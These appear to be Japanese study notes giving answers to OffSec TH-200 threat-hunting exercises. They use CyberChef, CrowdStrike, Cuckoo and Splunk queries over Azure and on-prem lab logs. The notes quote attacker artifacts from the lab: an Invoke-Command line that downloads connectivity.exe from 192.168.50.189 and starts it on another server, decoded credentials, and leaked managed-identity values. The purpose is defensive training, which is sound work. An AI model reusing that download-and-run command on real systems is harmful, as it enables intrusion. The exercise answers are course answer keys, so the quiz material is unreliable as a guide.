C:\Users\e.taylor\Downloads\qBittorrentPortable
```

[ヒントを表示](https://portal.offsec.com/courses/th-200-184134/learning/threat-hunting-without-iocs-178724/threat-hunting-for-new-iocs-178743/custom-threat-hunting-with-crowdstrike-falcon-178727#)


4. この演習では、Cyber​​Chef の活用方法をより深く理解します。ネットワークデータを用いたプロアクティブな脅威ハンティング（学習モジュールのシナリオとは無関係）中に、予期しないネットワークリクエストを傍受しました。この脅威活動は、重要なデータを隠すために難読化を頻繁に使用する特定の脅威アクターによるものだと結論付けました。このデータの難読化を解除できますか？

```
59--000--6d--000--78--000--68--000--59--000--32--000--74--000--6f--000--59--000--58--000--52--000--6f--000--59--000--57--000--4e--000--72--000--5a--000--58--000--4a--000--36--000--4f--000--6e--000--42--000--68--000--63--000--33--000--4e--000--33--000--62--000--33--000--4a--000--6b--000--4d--000--51--000--3d--000--3d
```
- 「find/replace」でRegex→-,000
すると、「YmxhY2toYXRoYWNrZXJ6OnBhc3N3b3JkMQ==」
特徴的にbase64??→レシピ追加


答え blackhathackerz:password1


---
## 6.2.4. サンドボックスを使った反復検索


1. このセクションの手順に従って、DB1 でアクティブな脅威を特定してください。次に、CLIENT5 の RTR を使用して、DB1 の侵害に使用された悪意のあるアーカイブを特定してください。このアーカイブのパス（ファイル名を含む）は何ですか？

答え C:\Users\t.allen\Downloads\software_updater.zip



2. このマシンにアーカイブがどのようにドロップされたかを調査してください。そのため、RTRを使用してThunderbirdのメールを分析してください。t.allen_に_このアーカイブを送信した送信者のメールアドレスは何ですか？

答え　　external_software_vendor@megacorp0ne.com
`"*.zip"
| "To: t.allen@megacorpone.com"
| ".com"`
falconのクエリで上記を検索。zipをComputerName:CLIENT5から t.allen@megacorpone.comに送信しているのを確認。
software_updater.zip

3. [bin.re にあるブログ記事](https://bin.re/blog/the-dga-of-bumblebee/)の DGA Python スクリプトのコードをKali in Browser マシンにコピーします。不足している二重引用符を追加してコードを修正し、**-m**の引数としてマジックバリュー**offsec**を使用します。最初に生成される DNS 名は何ですか？

答え　8ypkpxe7yse.life

┌──(kali㉿kali)-[~]
└─$ python3 test.py -m offsec



4. **Cuckoo で6.exe**の解析結果を再度確認してください。観察された動作は、 Windows におけるプロセス間通信 (IPC) の手法である[_名前付きパイプ_](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipes)とのやり取りを示しています。名前付きパイプは正当な目的でよく使用されますが、マルウェアによってローカル IPC にも使用されることがあります。特に、複雑なマルウェアシステムの異なるコンポーネント間の通信や、バックドア制御メカニズムとの通信に利用される可能性があります。名前付きパイプの完全な名前（パスを含む）は何ですか？

答え　\\.\pipe\9ede495823d354f6a87bc22de2f358ac
cuckoo
`NtCreateFile`


5. **Cuckoo の6.exe****の**解析をさらに詳しく検討してください。wbemprox.dllと**wbemcomn.dll**以外に、マルウェアによってシステム上で開かれた3つ目の DLL は何ですか？

答え cryptsp.dll

`Behavioral Analysis`からfileタブ選択。

---
# 7. 脅威ハンティングチャレンジラボ
---
## 7.1. TH-200 チャレンジラボ 1
---
### 7.1.1. ラボ環境
---
### 7.1.2. 課題と推奨事項
---
# 8. Azure での脅威ハンティング

---
## 8.1. 青い干し草の山から針を見つける

---
## 8.1.1. 環境の紹介


---
## 8.1.2. ハイブリッド環境における資格情報攻撃


1. このセクションの手順に従って、_JayWalk3rs脅威アクターの潜在的な活動を分析してください。2024年11月27日の__Wilhelmina_の初回ログインのタイムスタンプは、MM/DD/YY H:MM:SS形式で何ですか？（[ _Time_ ]列のタイムスタンプを使用してください）

答え 11/27/24 9:02:40.306 AM
```
index="azure_appservices" | spath | search eventType="LoginAttempt" username="wilhelmina" status=Successful
```


2. Entraインデックス（_azure_entra ）で、_ _wilhelmina@offsechybrid.onmicrosoft.com_のログイン成功履歴を検索_し_てください。properties.appDisplayName フィールドに記録されているAzure PortalとADIbizaUXのログイン以外に、どのようなアプリが記録されていますか？
　
答え　Microsoft Azure PowerShell
成功のログじゃないけど？
```
index="azure_entra" "wilhelmina@offsechybrid.onmicrosoft.com"
```


3. ログイン試行で MFA が使用されたかどうかを判断するEntra の SignInLogs (インデックス: _azure_entra_ )のフィールドは何ですか?

答え　properties.authenticationDetails.authenticationStepRequirement

```
index="azure_entra" operationName="Sign-in activity"
```

---

## 8.1.3. Vault には何が入っているのですか?

1. このセクションの手順に従って、Azure における脅威アクターの活動を分析してください。攻撃者が環境変数をリストすることで取得した ID ヘッダーの値は何ですか？

答え　8f6fe7c128a33ecebb292224f4d5d78b626b3afba1b82

マネージドIDは2つの環境変数（IDENTITY_ENDPOINTとIDENTITY_HEADER ）に依存するため、表示させようとした模様。
```
\r\nIDENTITY_HEADER                5A8D13B058B8465D9AEBC52D6ECBAC88
\r\nIDENTITY_ENDPOINT              http://127.0.0.1:41013/msi/token/
```

2. この演習と次の演習では、次の Azure Key Vault イベントを確認します。

```
{
  "time": "2024-12-01T09:45:12.1234560Z",
  "category": "AuditEvent",
  "operationName": "SecretGet",
  "resultType": "Success",
  "correlationId": "a9f58b2d-5c73-4ac3-b8a6-9f15df31e02c",
  "callerIpAddress": "203.0.113.10",
  "identity": {
    "claim": {
      "oid": "7991ac3e-6b83-42fd-c3b7-7d2c85978dfg",
      "appid": "12b00477-33dc-4f52-7c3f-7652be5dc78f",
      "appidacr": "2",
      "xms_mirid": "/subscriptions/2234e01d-6a53-4abc-9d1e-40a9de9123f2/resourcegroups/MegacorpTwo_AZURE/providers/Microsoft.Web/sites/mct-internal",
      "xms_az_nwperimid": [],
      "idtyp": "app"
    }
  },
  "properties": {
    "id": "https://AUSTRIA-Kangaroo.vault.azure.net/secrets/AUSTRIA-KangarooSRV1-root/d123e4567d89b12c3456789abcdef012",
    "clientInfo": "SuperCloudHackingTool v1.7",
    "httpStatusCode": 200,
    "requestUri": "https://AUSTRIA-Kangaroo.vault.azure.net/secrets/AUSTRIA-KangarooSRV1-root/?api-version=7.0",
    "isRbacAuthorized": true,
    "appliedAssignmentId": "7e9d4c1058f8e4f0887c30b45f63aef1",
    "tlsVersion": "TLS1_3"
  },
  "resourceId": "/SUBSCRIPTIONS/2234E01D-6A53-4ABC-9D1E-40A9DE9123F2/RESOURCEGROUPS/MEGACORPTWO_AZURE/PROVIDERS/MICROSOFT.KEYVAULT/VAULTS/AUSTRIA-KANGAROO",
  "operationVersion": "7.0",
  "resultSignature": "OK",
  "durationMs": "89"
}
```

Key Vault の名前は何ですか?

答え　AUSTRIA-KangarooSRV1-root

- リソースIDに記載
```
"resourceId": "/SUBSCRIPTIONS/2234E01D-6A53-4ABC-9D1E-40A9DE9123F2/RESOURCEGROUPS/MEGACORPTWO_AZURE/PROVIDERS/MICROSOFT.KEYVAULT/VAULTS/AUSTRIA-KANGAROO",
```


3. 演習 2 で提供されているイベントを確認してください。取得されたシークレットの名前は何ですか?

答え AUSTRIA-KangarooSRV1-root
"properties"に記載


4. 演習 2 で提供されたイベントを確認してください。秘密にアクセスするために使用されたと記録されたアプリケーションは何ですか?

答え　SuperCloudHackingTool v1.7
"clientInfo"に記載

---

## 8.2. オンプレミスでの脅威アクターの追跡

---

## 8.2.1. 自動化の悪用


1. _このセクションの手順に従って、Azure Automationに関連するJayWalk3rs_グループの活動を分析してください。ユーザーアカウント_magdalenaを_`azure_entra`利用している脅威アクターのログインのインデックスに記録されているユーザーエージェントは何ですか？

答え Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0 OS/10.0.26100

まず下記で、automationアカウントに関する当該ユーザーの動きを確認
```
index="azure_automation"  "magdalena" 
| spath
| sort _time
```
で
11/27/24　12:56:13.425 PM　dd2cb4f7-f67e-4463-bca5-8d166bacef7a　→３回目のrubnbook変更
11/27/24　12:58:43.559 PM　にjob作成
を確認。ここからインデックスを変えて、この変更時間までに行われた直近のログインを確認。
```
index="azure_entra"   latest="11/27/2024:12:56:13" dd2cb4f7-f67e-4463-bca5-8d166bacef7a  category=SignInLogs | sort _time
```


2. 演習 1 のイベントをさらに確認してください。これらのイベントでログインを実行するために記録されたオペレーティング システムは何ですか。

答え　Windows10

当該イベントの
```
deviceDetail: { [-]
       browser: Edge 131.0.0
       deviceId:
       operatingSystem: Windows10
```
に記載。


3. 前回の演習で発生したイベントをさらに確認してください。これらのログインアクティビティで記録されたブラウザのバージョンは何ですか？（ユーザーエージェントではありません）

答え　Edge 131.0.0
前の問、同様


4. `connectivity.exe`SRV2のファイル作成イベントで記録された画像の名前は何ですか?

答え　C:\Program Files\PowerShell\7\pwsh.exe

```
index="*" "connectivity.exe"  host=SRV2  EventCode=11 | sort _time
```



---

## 8.2.2. ドメイン支配の獲得

1. このセクションの手順に従って、脅威アクターがオンプレミス環境を完全に侵害した行動を分析してください。PowerShell操作ログを確認し、スクリプトの完全なスクリプトを含むイベントを見つけてください`decrypt_msol_v2.ps1`。このイベントのScriptBlock IDは何ですか？

答え　95289063-576f-4241-8d42-3e3554fdf2b7
(スクリプトの中身が記載。このイベント以外は→{$_.node.InnerText}は、XMLノードからテキストを抽出するためのコード)
```
index="*" "decrypt_msol_v2.ps1"  EventCode=4104 | sort _time
```


2. SRV2における脅威アクターの活動を調査しなさい。彼らはこのマシンでドメイン列挙ツールを使用しました。このツールの実行につながったアーカイブの名前は何ですか？（ファイルパスを除いた回答を入力してください）

答え　C:\20241127050915_BloodHound.zip
```
index="*" host="SRV2"
| where isnotnull(Image) AND Image!="" 
      AND NOT match(lower(Image), "^c:\\\\windows")
      AND NOT match(lower(Image), "system")
      AND NOT match(lower(Image), "c:\\\\program files")
      AND NOT match(lower(ParentImage), "^c:\\\\windows\\\\system32")
| table _time ParentProcessId ParentImage ProcessId Image CommandLine
| sort _time
```
→C:\SharpHound.exeを確認

```
index="*" SharpHound.exe EventCode=11 "*.zip"
| sort _time
```
→C:\20241127050915_BloodHound.zipを確認


3. `connectivity.exe`SRV1 にダウンロードするために SRV2 で入力されたコマンドのスクリプト ブロックの内容は何ですか?

答え　Invoke-Command -Session $session -ScriptBlock { iwr -uri http://192.168.50.189/connectivity.exe -outfile C:\Windows\Tasks\connectivity.exe; Start-Process -FilePath "C:\Windows\Tasks\connectivity.exe" }

```
index="*" connectivity.exe  EventCode=4104 | sort _time
```


---

